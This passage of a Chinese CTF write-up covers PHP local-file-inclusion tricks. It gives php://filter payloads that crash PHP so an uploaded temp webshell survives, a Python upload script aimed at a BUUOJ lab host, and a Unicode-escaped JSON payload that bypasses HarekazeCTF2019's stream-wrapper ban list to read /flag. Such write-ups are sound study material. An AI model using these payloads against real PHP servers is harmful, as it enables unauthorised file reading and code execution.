[](https://www.cnblogs.com/tr1ple/p/11301743.html)

[](https://www.cnblogs.com/linuxsec/articles/11278477.html)

> php < 7.2: php://filter/string.strip_tags/resource=/etc/passwd
>
> php7 老版本通杀: php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA

脚本如下

```python
import threading
import requests

files = [
    ('file', ('xx.txt', '<?php phpinfo();?>')),
]

res = requests.post('http://e5352e08-ad57-4efe-a721-01303b3e75db.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd',files=files)

print(res.text)
```

访问 dir.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211943513.png)

最后包含该临时文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210211944403.png)

## [HarekazeCTF2019]encode_and_encode

query.php

```php
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);
```

json decode 时会自动把 `\u` 开头的 Unicode 编码转换为正常的字符串 (看 wp 才发现的, 一搜这个技巧出来的全都是这题的 wp...)

在线工具 [](https://tool.chinaz.com/tools/native_ascii.aspx)

代码同时也对 content 做了过滤, 这里自然而然就想到了 php://filter + base64 绕过

```json
{"page": "\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0072\u0065\u0061\u0064\u003d\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202210212015375.png)

